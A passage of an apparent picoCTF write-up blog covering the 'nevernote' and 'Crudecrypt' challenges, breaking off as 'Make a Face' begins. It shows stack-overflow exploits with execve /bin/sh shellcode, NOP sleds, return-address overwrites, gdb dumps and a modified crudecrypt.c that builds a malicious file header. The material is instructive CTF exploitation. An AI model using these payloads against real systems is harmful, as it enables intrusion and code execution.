<p>Right, a segfault because <code>edx</code> points to a place that doesn&rsquo;t exist. Let&rsquo;s fix that by supplying the address of safe_buffer:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">pico1139</span><span class="err">@</span><span class="nl">shell</span><span class="p">:</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">nevernote</span><span class="err">$</span> <span class="p">(</span><span class="n">echo</span> <span class="s">&quot;bleh&quot;</span><span class="p">;</span> <span class="n">echo</span> <span class="s">&quot;a&quot;</span><span class="p">;</span> <span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="err">&#39;</span><span class="n">print</span> <span class="s">&quot;A&quot;</span><span class="o">*</span><span class="mi">512</span><span class="o">+</span><span class="s">&quot;AAAA&quot;</span><span class="o">+</span><span class="s">&quot;</span><span class="se">\x50\xc0\x04\x08CC</span><span class="s">CCCCCCCCCCCCCCDDDD</span><span class="se">\x50\xc0\x04\x08FF</span><span class="s">FF&quot;</span><span class="err">&#39;</span><span class="p">)</span> <span class="o">&gt;</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">in</span>
</span><span class='line'><span class="p">...</span>
</span><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">r</span> <span class="o">&lt;</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">in</span>
</span><span class='line'><span class="n">Starting</span> <span class="nl">program</span><span class="p">:</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">nevernote</span><span class="o">/</span><span class="n">nevernote</span> <span class="o">&lt;</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">in</span>
</span><span class='line'><span class="n">Please</span> <span class="n">enter</span> <span class="n">your</span> <span class="nl">name</span><span class="p">:</span> <span class="n">Enter</span> <span class="n">a</span> <span class="nl">command</span><span class="p">:</span> <span class="n">Write</span> <span class="n">your</span> <span class="nl">note</span><span class="p">:</span>
</span><span class='line'><span class="n">Program</span> <span class="n">received</span> <span class="n">signal</span> <span class="n">SIGSEGV</span><span class="p">,</span> <span class="n">Segmentation</span> <span class="n">fault</span><span class="p">.</span>
</span><span class='line'><span class="mh">0x44444444</span> <span class="n">in</span> <span class="o">??</span> <span class="p">()</span>
</span></code></pre></td></tr></table></div></figure>


<p>w00t! We have control over EIP! Since ASLR is off and so is NX, we can just jump a piece of shellcode. Let’s stick in the shellcode (23 bytes execve /bin/sh) and alter the canary to 4*0x90 (which is the start of the NOP sled). Let&rsquo;s overwrite EIP with <code>0x804c070</code> to jump in the middle of our NOP sled. We cat the payload &amp; use another cat to keep shell alive:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">pico1139</span><span class="err">@</span><span class="nl">shell</span><span class="p">:</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">nevernote</span><span class="err">$</span> <span class="p">(</span><span class="n">echo</span> <span class="s">&quot;bleh&quot;</span><span class="p">;</span> <span class="n">echo</span> <span class="s">&quot;a&quot;</span><span class="p">;</span> <span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="err">&#39;</span><span class="n">print</span> <span class="s">&quot;</span><span class="se">\x90</span><span class="s">&quot;</span><span class="o">*</span><span class="p">(</span><span class="mi">512</span><span class="o">-</span><span class="mi">23</span><span class="p">)</span><span class="o">+</span><span class="s">&quot;</span><span class="se">\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80</span><span class="s">&quot;</span><span class="o">+</span><span class="s">&quot;</span><span class="se">\x90\x90\x90\x90</span><span class="s">&quot;</span><span class="o">+</span><span class="s">&quot;</span><span class="se">\x50\xc0\x04\x08CC</span><span class="s">CCCCCCCCCCCCCC</span><span class="se">\x70\xc0\x04\x08\x50\xc0\x04\x08FF</span><span class="s">FF&quot;</span><span class="err">&#39;</span><span class="p">)</span> <span class="o">&gt;</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">in</span>
</span><span class='line'>
</span><span class='line'><span class="n">pico1139</span><span class="err">@</span><span class="nl">shell</span><span class="p">:</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">nevernote</span><span class="err">$</span> <span class="p">(</span><span class="n">cat</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">in</span><span class="p">;</span> <span class="n">cat</span><span class="p">)</span> <span class="o">|</span> <span class="p">.</span><span class="o">/</span><span class="n">nevernote</span>
</span><span class='line'><span class="n">Please</span> <span class="n">enter</span> <span class="n">your</span> <span class="nl">name</span><span class="p">:</span> <span class="n">Enter</span> <span class="n">a</span> <span class="nl">command</span><span class="p">:</span> <span class="n">Write</span> <span class="n">your</span> <span class="nl">note</span><span class="p">:</span>
</span><span class='line'><span class="n">id</span>
</span><span class='line'><span class="n">uid</span><span class="o">=</span><span class="mi">11066</span><span class="p">(</span><span class="n">pico1139</span><span class="p">)</span> <span class="n">gid</span><span class="o">=</span><span class="mi">1017</span><span class="p">(</span><span class="n">picogroup</span><span class="p">)</span> <span class="n">egid</span><span class="o">=</span><span class="mi">1011</span><span class="p">(</span><span class="n">nevernote</span><span class="p">)</span> <span class="n">groups</span><span class="o">=</span><span class="mi">1017</span><span class="p">(</span><span class="n">picogroup</span><span class="p">)</span>
</span><span class='line'><span class="n">whoami</span>
</span><span class='line'><span class="n">pico1139</span>
</span><span class='line'><span class="n">cat</span> <span class="n">flag</span><span class="o">*</span>
</span><span class='line'><span class="n">the_hairy_canary_fairy_is_still_very_wary</span>
</span></code></pre></td></tr></table></div></figure>


<p>The flag is <code>the_hairy_canary_fairy_is_still_very_wary</code>.</p>

<h1>Crudecrypt (180 points)</h1>

<p>We are given access to a program that can encrypt and decrypt a file. The program does not try to sanitize user input when decrypting:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="kt">void</span> <span class="nf">decrypt_file</span><span class="p">(</span><span class="kt">FILE</span><span class="o">*</span> <span class="n">enc_file</span><span class="p">,</span> <span class="kt">FILE</span><span class="o">*</span> <span class="n">raw_file</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">char</span><span class="o">*</span> <span class="n">key</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="kt">int</span> <span class="n">size</span> <span class="o">=</span> <span class="n">file_size</span><span class="p">(</span><span class="n">enc_file</span><span class="p">);</span>
</span><span class='line'>    <span class="kt">char</span><span class="o">*</span> <span class="n">enc_buf</span> <span class="o">=</span> <span class="n">calloc</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">size</span><span class="p">);</span>
</span><span class='line'>    <span class="n">fread</span><span class="p">(</span><span class="n">enc_buf</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">size</span><span class="p">,</span> <span class="n">enc_file</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="n">decrypt_buffer</span><span class="p">(</span><span class="n">enc_buf</span><span class="p">,</span> <span class="n">size</span><span class="p">,</span> <span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">key</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;There was an error decrypting the file!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>        <span class="k">return</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="kt">char</span><span class="o">*</span> <span class="n">raw_buf</span> <span class="o">=</span> <span class="n">enc_buf</span><span class="p">;</span>
</span><span class='line'>    <span class="n">file_header</span><span class="o">*</span> <span class="n">header</span> <span class="o">=</span> <span class="p">(</span><span class="n">file_header</span><span class="o">*</span><span class="p">)</span> <span class="n">raw_buf</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="n">header</span><span class="o">-&gt;</span><span class="n">magic_number</span> <span class="o">!=</span> <span class="n">MAGIC</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Invalid password!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>        <span class="k">return</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">check_hostname</span><span class="p">(</span><span class="n">header</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'>        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;[#] Warning: File not encrypted by current machine.</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="c1">// snip</span>
</span><span class='line'>
</span><span class='line'><span class="kt">bool</span> <span class="n">check_hostname</span><span class="p">(</span><span class="n">file_header</span><span class="o">*</span> <span class="n">header</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="kt">char</span> <span class="n">saved_host</span><span class="p">[</span><span class="n">HOST_LEN</span><span class="p">],</span> <span class="n">current_host</span><span class="p">[</span><span class="n">HOST_LEN</span><span class="p">];</span>
</span><span class='line'>
</span><span class='line'>    <span class="c1">// unsafe strncpy if we supply a large string for header-&gt;host</span>
</span><span class='line'>    <span class="n">strncpy</span><span class="p">(</span><span class="n">saved_host</span><span class="p">,</span> <span class="n">header</span><span class="o">-&gt;</span><span class="n">host</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">header</span><span class="o">-&gt;</span><span class="n">host</span><span class="p">));</span>
</span><span class='line'>    <span class="n">safe_gethostname</span><span class="p">(</span><span class="n">current_host</span><span class="p">,</span> <span class="n">HOST_LEN</span><span class="p">);</span>
</span><span class='line'>    <span class="k">return</span> <span class="n">strcmp</span><span class="p">(</span><span class="n">saved_host</span><span class="p">,</span> <span class="n">current_host</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>If the attacker can supply an encrypted file header with a large host field, then we can overflow the saved_host array on the stack &amp; overwrite EIP. We modified the source of crudecrypt.c to generate such a file:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="kt">void</span> <span class="nf">encrypt_file</span><span class="p">(</span><span class="kt">FILE</span><span class="o">*</span> <span class="n">raw_file</span><span class="p">,</span> <span class="kt">FILE</span><span class="o">*</span> <span class="n">enc_file</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">char</span><span class="o">*</span> <span class="n">key</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="kt">int</span> <span class="n">size</span> <span class="o">=</span> <span class="n">file_size</span><span class="p">(</span><span class="n">raw_file</span><span class="p">);</span>
</span><span class='line'>    <span class="kt">size_t</span> <span class="n">block_size</span> <span class="o">=</span> <span class="n">MULT_BLOCK_SIZE</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="n">file_header</span><span class="p">)</span> <span class="o">+</span> <span class="n">size</span><span class="p">);</span>
</span><span class='line'>    <span class="kt">char</span><span class="o">*</span> <span class="n">padded_block</span> <span class="o">=</span> <span class="n">calloc</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">block_size</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">file_header</span> <span class="n">header</span><span class="p">;</span>
</span><span class='line'>    <span class="n">init_file_header</span><span class="p">(</span><span class="o">&amp;</span><span class="n">header</span><span class="p">,</span> <span class="n">size</span><span class="p">);</span>
</span><span class='line'>    <span class="c1">//safe_gethostname(header.host, HOST_LEN);</span>
</span><span class='line'>    <span class="n">strcpy</span><span class="p">(</span><span class="n">header</span><span class="p">.</span><span class="n">host</span><span class="p">,</span> <span class="s">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCDDDDEEEEFFFFAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span><span class="p">);</span>
</span></code></pre></td></tr></table></div></figure>


<p>We encrypted the payload using this modified crudecrypt.c. Then we decrypted it, observing the crash!</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#0  0x45454545 in ?? ()</span>
</span><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">i</span> <span class="n">r</span>
</span><span class='line'><span class="n">eax</span>            <span class="mh">0xffffff00</span>  <span class="o">-</span><span class="mi">256</span>
</span><span class='line'><span class="n">ecx</span>            <span class="mh">0x73</span>    <span class="mi">115</span>
</span><span class='line'><span class="n">edx</span>            <span class="mh">0xffffd660</span>  <span class="o">-</span><span class="mi">10656</span>   <span class="o">&gt;</span> <span class="n">perfect</span> <span class="n">pointer</span> <span class="n">to</span> <span class="n">start</span> <span class="n">of</span> <span class="n">buffer</span>
</span><span class='line'><span class="n">ebx</span>            <span class="mh">0xf7dea000</span>  <span class="o">-</span><span class="mi">136404992</span>
</span><span class='line'><span class="n">esp</span>            <span class="mh">0xffffd690</span>  <span class="mh">0xffffd690</span>
</span><span class='line'><span class="n">ebp</span>            <span class="mh">0x44444444</span>  <span class="mh">0x44444444</span>
</span><span class='line'><span class="n">esi</span>            <span class="mh">0x0</span> <span class="mi">0</span>
</span><span class='line'><span class="n">edi</span>            <span class="mh">0x0</span> <span class="mi">0</span>
</span><span class='line'><span class="n">eip</span>            <span class="mh">0x45454545</span>  <span class="mh">0x45454545</span>
</span><span class='line'><span class="n">eflags</span>         <span class="mh">0x10286</span> <span class="p">[</span> <span class="n">PF</span> <span class="n">SF</span> <span class="n">IF</span> <span class="n">RF</span> <span class="p">]</span>
</span><span class='line'><span class="n">cs</span>             <span class="mh">0x23</span>    <span class="mi">35</span>
</span><span class='line'><span class="n">ss</span>             <span class="mh">0x2b</span>    <span class="mi">43</span>
</span><span class='line'><span class="n">ds</span>             <span class="mh">0x2b</span>    <span class="mi">43</span>
</span><span class='line'><span class="n">es</span>             <span class="mh">0x2b</span>    <span class="mi">43</span>
</span><span class='line'><span class="n">fs</span>             <span class="mh">0x0</span> <span class="mi">0</span>
</span><span class='line'><span class="n">gs</span>             <span class="mh">0x63</span>    <span class="mi">99</span>
</span></code></pre></td></tr></table></div></figure>


<p>Looks like ALSR is off! There was no <code>jmp edx</code> in the binary that I could find, so instead, let&rsquo;s just jump to the buffer:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="kt">void</span> <span class="nf">encrypt_file</span><span class="p">(</span><span class="kt">FILE</span><span class="o">*</span> <span class="n">raw_file</span><span class="p">,</span> <span class="kt">FILE</span><span class="o">*</span> <span class="n">enc_file</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">char</span><span class="o">*</span> <span class="n">key</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="kt">int</span> <span class="n">size</span> <span class="o">=</span> <span class="n">file_size</span><span class="p">(</span><span class="n">raw_file</span><span class="p">);</span>
</span><span class='line'>    <span class="kt">size_t</span> <span class="n">block_size</span> <span class="o">=</span> <span class="n">MULT_BLOCK_SIZE</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="n">file_header</span><span class="p">)</span> <span class="o">+</span> <span class="n">size</span><span class="p">);</span>
</span><span class='line'>    <span class="kt">char</span><span class="o">*</span> <span class="n">padded_block</span> <span class="o">=</span> <span class="n">calloc</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">block_size</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">file_header</span> <span class="n">header</span><span class="p">;</span>
</span><span class='line'>    <span class="n">init_file_header</span><span class="p">(</span><span class="o">&amp;</span><span class="n">header</span><span class="p">,</span> <span class="n">size</span><span class="p">);</span>
</span><span class='line'>    <span class="c1">//safe_gethostname(header.host, HOST_LEN);</span>
</span><span class='line'>    <span class="kt">char</span> <span class="n">payload</span><span class="p">[]</span> <span class="o">=</span> <span class="s">&quot;</span><span class="se">\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x8d\x54\x24\x08\x50\x53\x8d\x0c\x24\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\xcd\x80</span><span class="s">&quot;&quot;BBCCCCDDDD</span><span class="se">\x30\xd6\xff\xff</span><span class="s">&quot;&quot;FFFFAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span><span class="p">;</span>
</span><span class='line'>    <span class="n">strcpy</span><span class="p">(</span><span class="n">header</span><span class="p">.</span><span class="n">host</span><span class="p">,</span> <span class="n">payload</span><span class="p">);</span>
</span></code></pre></td></tr></table></div></figure>


<p>compile &amp; run:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">bas</span><span class="err">@</span><span class="nl">tritonal</span><span class="p">:</span><span class="o">~/</span><span class="n">tmp</span><span class="o">/</span><span class="n">picoctf</span><span class="o">/</span><span class="n">crudecrypt</span><span class="err">$</span> <span class="n">gcc</span> <span class="o">-</span><span class="n">o</span> <span class="n">exploit</span> <span class="n">exploit</span><span class="p">.</span><span class="n">c</span> <span class="o">-</span><span class="n">lcrypto</span> <span class="o">-</span><span class="n">lmcrypt</span> <span class="o">-</span><span class="n">lssl</span> <span class="o">-</span><span class="n">m32</span>
</span><span class='line'><span class="n">bas</span><span class="err">@</span><span class="nl">tritonal</span><span class="p">:</span><span class="o">~/</span><span class="n">tmp</span><span class="o">/</span><span class="n">picoctf</span><span class="o">/</span><span class="n">crudecrypt</span><span class="err">$</span> <span class="p">.</span><span class="o">/</span><span class="n">exploit</span> <span class="n">encrypt</span> <span class="p">.</span><span class="o">/</span><span class="n">a</span> <span class="p">.</span><span class="o">/</span><span class="n">b</span>
</span><span class='line'><span class="o">-=-</span> <span class="n">Welcome</span> <span class="n">to</span> <span class="n">CrudeCrypt</span> <span class="mf">0.1</span> <span class="n">Beta</span> <span class="o">-=-</span>
</span><span class='line'><span class="o">-&gt;</span> <span class="n">File</span> <span class="nl">password</span><span class="p">:</span>
</span><span class='line'>
</span><span class='line'><span class="o">=&gt;</span> <span class="n">Encrypted</span> <span class="n">file</span> <span class="n">successfully</span>
</span><span class='line'><span class="o">***</span> <span class="n">Error</span> <span class="n">in</span> <span class="err">`</span><span class="p">.</span><span class="o">/</span><span class="n">exploit</span><span class="err">&#39;</span><span class="o">:</span> <span class="n">free</span><span class="p">()</span><span class="o">:</span> <span class="n">invalid</span> <span class="nl">pointer</span><span class="p">:</span> <span class="mh">0x0920f300</span> <span class="o">***</span>
</span><span class='line'><span class="n">Aborted</span> <span class="p">(</span><span class="n">core</span> <span class="n">dumped</span><span class="p">)</span>
</span><span class='line'><span class="n">bas</span><span class="err">@</span><span class="nl">tritonal</span><span class="p">:</span><span class="o">~/</span><span class="n">tmp</span><span class="o">/</span><span class="n">picoctf</span><span class="o">/</span><span class="n">crudecrypt</span><span class="err">$</span> <span class="n">cat</span> <span class="n">b</span> <span class="o">|</span><span class="n">base64</span>
</span><span class='line'><span class="n">qmikXTf65Xauen</span><span class="o">/</span><span class="n">t3a0FDf1uZMI3baSe5I9hTVEJ5t04R0Vb8RgBltvIwvCvmbaOtou7THTwR5Vy</span>
</span><span class='line'><span class="n">B9dA2GyFxMLF</span><span class="o">/</span><span class="n">wyNDY9V</span><span class="o">/</span><span class="n">y2bveRKWLam5xehXkNXQFSMhUJcd3RNwfgFxVlYswx4VfW1CiqmV45S</span>
</span><span class='line'><span class="n">ZzbvWLRmeRdk1vyxXQSq0nyDhcPi8GhwnKp6R1ri</span>
</span></code></pre></td></tr></table></div></figure>


<p>We transferred the base64 encoded payload to remote machine. We had to adjust the pointer to the shellcode because the address changes on stack due to environment changing. We found this new pointer by simply running gdb.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">pico1139</span><span class="err">@</span><span class="nl">shell</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="p">.</span><span class="c1">///////////////crude_crypt decrypt ./sp ./bleh</span>
</span><span class='line'><span class="o">-=-</span> <span class="n">Welcome</span> <span class="n">to</span> <span class="n">CrudeCrypt</span> <span class="mf">0.1</span> <span class="n">Beta</span> <span class="o">-=-</span>
</span><span class='line'><span class="o">-&gt;</span> <span class="n">File</span> <span class="nl">password</span><span class="p">:</span>
</span><span class='line'>
</span><span class='line'><span class="n">Segmentation</span> <span class="n">fault</span> <span class="p">(</span><span class="n">core</span> <span class="n">dumped</span><span class="p">)</span>
</span><span class='line'><span class="p">...</span>
</span><span class='line'><span class="cp">#0  0xffffd674 in ?? ()</span>
</span><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">i</span> <span class="n">r</span>
</span><span class='line'><span class="n">eax</span>            <span class="mh">0xffffff00</span>  <span class="o">-</span><span class="mi">256</span>
</span><span class='line'><span class="n">ecx</span>            <span class="mh">0xb4</span>    <span class="mi">180</span>
</span><span class='line'><span class="n">edx</span>            <span class="mh">0xffffd5f2</span>  <span class="o">-</span><span class="mi">10766</span>
</span><span class='line'><span class="p">...</span>
</span><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">x</span><span class="o">/</span><span class="n">s</span> <span class="mh">0xffffd5f2</span>
</span><span class='line'><span class="mh">0xffffd5f2</span><span class="o">:</span>    <span class="s">&quot;Ph//shh/bin</span><span class="se">\211\343\215</span><span class="s">T$</span><span class="se">\b</span><span class="s">...BBCCCCDDDD&quot;</span>
</span><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">x</span><span class="o">/</span><span class="mi">2</span><span class="n">i</span> <span class="mh">0xffffd5f0</span>
</span><span class='line'>   <span class="mh">0xffffd5f0</span><span class="o">:</span> <span class="n">xor</span>    <span class="o">%</span><span class="n">eax</span><span class="p">,</span><span class="o">%</span><span class="n">eax</span>
</span><span class='line'>   <span class="mh">0xffffd5f2</span><span class="o">:</span> <span class="n">push</span>   <span class="o">%</span><span class="n">eax</span>
</span></code></pre></td></tr></table></div></figure>


<p>After adjusting the address to <code>0xffffd5f0</code> in the exploit, we end up with a shell! A NOP sled would&rsquo;ve been easy, in this case.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">pico1139</span><span class="err">@</span><span class="nl">shell</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">cat</span> <span class="n">b</span> <span class="o">|</span><span class="n">base64</span> <span class="o">-</span><span class="n">d</span> <span class="o">&gt;</span> <span class="p">.</span><span class="o">/</span><span class="n">sp</span>
</span><span class='line'><span class="n">pico1139</span><span class="err">@</span><span class="nl">shell</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">crudecrypt</span><span class="o">/</span><span class="n">crude_crypt</span> <span class="n">decrypt</span> <span class="p">.</span><span class="o">/</span><span class="n">sp</span> <span class="p">.</span><span class="o">/</span><span class="n">bleh</span>
</span><span class='line'><span class="o">-=-</span> <span class="n">Welcome</span> <span class="n">to</span> <span class="n">CrudeCrypt</span> <span class="mf">0.1</span> <span class="n">Beta</span> <span class="o">-=-</span>
</span><span class='line'><span class="o">-&gt;</span> <span class="n">File</span> <span class="nl">password</span><span class="p">:</span>
</span><span class='line'>
</span><span class='line'><span class="err">$</span> <span class="n">id</span>
</span><span class='line'><span class="n">uid</span><span class="o">=</span><span class="mi">11066</span><span class="p">(</span><span class="n">pico1139</span><span class="p">)</span> <span class="n">gid</span><span class="o">=</span><span class="mi">1017</span><span class="p">(</span><span class="n">picogroup</span><span class="p">)</span> <span class="n">egid</span><span class="o">=</span><span class="mi">1012</span><span class="p">(</span><span class="n">crudecrypt</span><span class="p">)</span> <span class="n">groups</span><span class="o">=</span><span class="mi">1017</span><span class="p">(</span><span class="n">picogroup</span><span class="p">)</span>
</span><span class='line'><span class="err">$</span> <span class="n">whoami</span>
</span><span class='line'><span class="n">pico1139</span>
</span><span class='line'><span class="err">$</span> <span class="n">cat</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">crudecrypt</span><span class="o">/</span><span class="n">flag</span><span class="p">.</span><span class="n">txt</span>
</span><span class='line'><span class="n">writing_software_is_hard</span>
</span></code></pre></td></tr></table></div></figure>


<p>The flag is <code>writing_software_is_hard</code>.</p>

<h1>Make a Face (100 points)</h1>

<p>We need to exploit a perl script running on a Webpage. This script takes user input and generates an &ldquo;avatar&rdquo;. We immediately figured Shellshock but this turned out to be wrong. The script is included in the webpage source:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
